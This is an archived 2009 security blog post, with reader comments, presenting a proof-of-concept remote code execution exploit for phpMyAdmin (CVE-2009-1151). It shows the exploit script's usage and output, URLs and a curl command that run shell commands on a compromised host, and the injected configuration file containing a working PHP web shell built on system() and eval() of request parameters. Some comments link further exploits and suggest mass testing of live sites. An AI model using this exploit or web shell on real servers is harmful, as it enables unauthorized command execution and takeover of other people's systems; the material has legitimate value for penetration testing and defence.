<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept</title><meta name="description" content="I couldn't find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow)."><meta property="name" content="CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept"><meta itemprop="name" content="CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept"><meta property="description" content="I couldn't find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow)."><meta itemprop="description" content="I couldn't find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow)."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/cve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept/"><meta property="og:title" content="CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept"><meta property="og:description" content="I couldn't find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow)."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept%2F?w=1024"><meta name="twitter:title" content="CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept"><meta name="twitter:description" content="I couldn't find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow)."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept</h1><div class="date">Tue, 09 Jun 2009 19:03:13 GMT</div><div class="author">by pagvac</div><div id="post-content"><p>I couldn&#39;t find any public PoC/exploit for this <a href="http://www.phpmyadmin.net/home_page/index.php">phpMyAdmin</a> vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it&#39;s still possible to perform remote command execution these days without relying on SQL injection (i.e.: <code>xp_cmdshell</code>) or a memory corruption bug (i.e.: heap overflow).</p>
<blockquote>
<p>All the documentation you need is in the script comments. I recommend you to go through it, before you actually run the script.</p>
</blockquote>
<p>After reading the public <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">advisory</a> and patched code, and playing around for a while, I managed to have a working PoC bash script. The script will allow you to remotely run shell commands and PHP code against vulnerable targets. Although in principle the vulnerability sounds quite simple, it actually took me a while to go from <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">advisory</a> to working attack code.</p>
<p>I&#39;m providing the script with the hope that it will help pentesters and security researchers. Please only test the script against your own systems, or systems you have been given permission to pentest! Don&#39;t be evil, it&#39;s not worth it.</p>
<h2 id="demo">Demo</h2>
<pre><code class="language-bash">$ ./phpMyAdminRCE.sh
usage: ./phpMyAdminRCE.sh &lt;phpMyAdmin_base_URL&gt;
i.e.: ./phpMyAdminRCE.sh http://target.tld/phpMyAdmin/</code></pre>
<pre><code class="language-bash">$ ./phpMyAdminRCE.sh http://172.16.211.10/phpMyAdmin-3.0.1.1/
[+] checking <span class="keyword">if</span> phpMyAdmin exists on URL provided ...
[+] phpMyAdmin cookie and form token received successfully. Good!
[+] attempting to inject phpinfo() ...
[+] success! phpinfo() injected successfully! output saved on /tmp/phpMyAdminRCE.sh.9217.phpinfo.flag.html
[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?p=phpinfo();
    please send any feedback/improvements <span class="keyword">for</span> this script to unknown.pentester&lt;AT_sign_goes_here&gt;gmail.com</code></pre>
<pre><code class="language-bash">$ curl <span class="string">"http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/"</span>
total 96
drwxr-xr-x   2 root   root  4096 Mar 11 10:12 bin
drwxr-xr-x   3 root   root  4096 May  6 10:01 boot
lrwxrwxrwx   1 root   root    11 Oct 12  2008 cdrom -&gt; media/cdrom
drwxr-xr-x  15 root   root 14300 Jun  5 09:02 dev
drwxr-xr-x 147 root   root 12288 Jun  5 09:02 etc
drwxr-xr-x   3 root   root  4096 Oct 18  2008 home
drwxr-xr-x   2 root   root  4096 Jul  2  2008 initrd
_[partial output removed <span class="keyword">for</span> brevity reasons]_</code></pre>
<p>Contents of <code>/config/config.inc.php</code> after our evil code has been successfully injected:</p>
<pre><code class="language-php"><span class="meta">&lt;?php</span>
<span class="comment">/*
 * Generated configuration file
 * Generated by: phpMyAdmin 3.0.1.1 setup script by Michal ÄŒihaÅ™ &lt;michal<span class="doctag">@cihar</span>.com&gt;
 * Version: $Id: setup.php 11423 2008-07-24 17:26:05Z lem9 $
 * Date: Tue, 09 Jun 2009 14:13:34 GMT
 */</span>

<span class="comment">/* Servers configuration */</span>
$i = <span class="number">0</span>;

<span class="comment">/* Server  (config:root) [1] */</span>
$i++;
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'host'</span>]=<span class="string">''</span>; <span class="keyword">if</span>($_GET[<span class="string">'c'</span>]){<span class="keyword">echo</span>
<span class="string">''</span>;system($_GET[<span class="string">'c'</span>]);<span class="keyword">echo</span> <span class="string">''</span>;}<span class="keyword">if</span>($_GET[<span class="string">'p'</span>]){<span class="keyword">echo</span>
<span class="string">''</span>;<span class="keyword">eval</span>($_GET[<span class="string">'p'</span>]);<span class="keyword">echo</span> <span class="string">''</span>;};<span class="comment">//'] = 'localhost';</span>
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'extension'</span>] = <span class="string">'mysqli'</span>;
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'connect_type'</span>] = <span class="string">'tcp'</span>;
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'compress'</span>] = <span class="keyword">false</span>;
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'auth_type'</span>] = <span class="string">'config'</span>;
$cfg[<span class="string">'Servers'</span>][$i][<span class="string">'user'</span>] = <span class="string">'root'</span>;

<span class="comment">/* End of servers configuration */</span>

<span class="meta">?&gt;</span></code></pre>
<h2 id="thanks">Thanks</h2>
<p>I&#39;d like to thank <a href="http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/">Greg Ose</a> for discovering such a cool vuln and doing a nice writeup about the technical details! Also big thanks to <a href="http://www.milw0rm.com/">str0ke</a> for testing this PoC script and providing such useful feedback!</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b16542002cdfb04f3872cfc2b0af7cf0?s=256&amp;d=retro" alt="Alexander Sverdlov"><span class="post-comment-author">Alexander Sverdlov</span><div class="post-comment-content">PDP, you did it again... what could I say? Your bash'es are a teaching example that perl and python are not the only way to reach the target.

Kudos!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Alexander, all the credits go to pagvac. He is the author of this post, not me. He is also a bash ninja :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/24d90db9e7de48f500cea793b087ae12?s=256&amp;d=retro" alt="Mike"><span class="post-comment-author">Mike</span><div class="post-comment-content">Nice Exploit. 

But there are plenty of awesome remote code execution vulns.  Don't Forget mysql's into_outfile!  Or Remote Code Execution with a Local File Include vulnerability! http://milw0rm.com/papers/260

using a .gif file: http://www.milw0rm.com/exploits/7947
Using apache log files: http://www.milw0rm.com/exploits/8298

Peace</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/771cca1f958647af344b28eaa38117ab?s=256&amp;d=retro" alt="å¢¨å°”æœ¬"><span class="post-comment-author">å¢¨å°”æœ¬</span><div class="post-comment-content">This is some great script to deal with phpMyAdmin. Thanks for sharing.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=256&amp;d=retro" alt="pagvac"><span class="post-comment-author">pagvac</span><div class="post-comment-content">thanks for the feedback guys. btw, here are some vulnerable versions in case anyone wants to experiment with the script:

http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-3.0.0-english.tar.gz&a=95960040
http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-3.0.1.1-english.tar.gz&a=95960040
http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-2.11.4-english.tar.gz&a=95960040
http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-2.11.9.3-english.tar.gz&a=95960040
http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-2.11.9.4-english.tar.gz&a=95960040</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6d9c79546224d78fb8b3d80d0016c94a?s=256&amp;d=retro" alt="Jose Miguel Esparza"><span class="post-comment-author">Jose Miguel Esparza</span><div class="post-comment-content">Hi there! Good PoC! I played with this vuln some weeks ago and I had had no time to write anything. It could be a good idea to add the vuln affecting the 3.1.3.1 version: http://www.phpmyadmin.net/home_page/security/PMASA-2009-4.php

It's the same concept but change some files and functions (the setup page is /setup/config.php now, for example). The vulnerable package to play with: http://sourceforge.net/project/downloading.php?group_id=23067&filename=phpMyAdmin-3.1.3.1-all-languages.tar.gz

Cheers!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=256&amp;d=retro" alt="pagvac"><span class="post-comment-author">pagvac</span><div class="post-comment-content">@Jose: thanks a lot for that. it should be quite simple to modify the PoC to exploit CVE-2009-1285. sweet!

will give it a try if i have some free time and/or feel inspired :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/cad980ba5cfd319a6c8ebf7a4c381c90?s=256&amp;d=retro" alt="ToR"><span class="post-comment-author">ToR</span><div class="post-comment-content">Nice work, works well also on v. 2.11.7.1 and 2.11.7 ;)

ToR</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6ba024fa4b77bf8eed5e8a9c64925814?s=256&amp;d=retro" alt="rosko"><span class="post-comment-author">rosko</span><div class="post-comment-content">as u said "nice reminder"</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=256&amp;d=retro" alt="pagvac"><span class="post-comment-author">pagvac</span><div class="post-comment-content">@ToR: thanks for testing the script on other versions bro 8-)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5b5c114e13c7b618dff01b687cbc75f9?s=256&amp;d=retro" alt="adriensk8"><span class="post-comment-author">adriensk8</span><div class="post-comment-content">Excellent....!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/cb89cd9a6126cc7da15286b1d455b796?s=256&amp;d=retro" alt="kecemplungkalen"><span class="post-comment-author">kecemplungkalen</span><div class="post-comment-content">old bug but new tread :) good job PDP i was testing for all indonesian phpmyadmin work fine :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/cb89cd9a6126cc7da15286b1d455b796?s=256&amp;d=retro" alt="kecemplungkalen"><span class="post-comment-author">kecemplungkalen</span><div class="post-comment-content">but nice pagvac :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/24bc4aa26be75c9d73abe1afed4b4bbc?s=256&amp;d=retro" alt="Hahnefeld"><span class="post-comment-author">Hahnefeld</span><div class="post-comment-content">I saw the security issue on ISPConfig - Community. Is it a problem with every phpMyAdmin-Version?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c603a4475ee125682b501b7dd202e3e0?s=256&amp;d=retro" alt="Corina Mandel"><span class="post-comment-author">Corina Mandel</span><div class="post-comment-content">We got this tip (the link) from a another programmer. And in fact: our phpMyAdmin-version was outdated and vulnerable :(</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/93d429cdd57ee8754f45df765890d2fb?s=256&amp;d=retro" alt="yadianna"><span class="post-comment-author">yadianna</span><div class="post-comment-content">I saw the security issue on ISPConfig â€“ Community. Is it a problem with every phpMyAdmin-Version?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/239373c6ffb410d75e75e5737a40e0b2?s=256&amp;d=retro" alt="droope"><span class="post-comment-author">droope</span><div class="post-comment-content">Woah man.... so many websites running this version of php my admin! 

Awesome find. Thanks for sharing.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/513af7a835e65c018e7fb03b98c9d99f?s=256&amp;d=retro" alt="unda"><span class="post-comment-author">unda</span><div class="post-comment-content">Well very cool to share this ... Thx</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/591801f83862ed836697deb8407bc761?s=256&amp;d=retro" alt="Golf"><span class="post-comment-author">Golf</span><div class="post-comment-content">Ran the script. Love it!</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2021 <a href=""></a>. All rights reserved.</p></footer></body></html>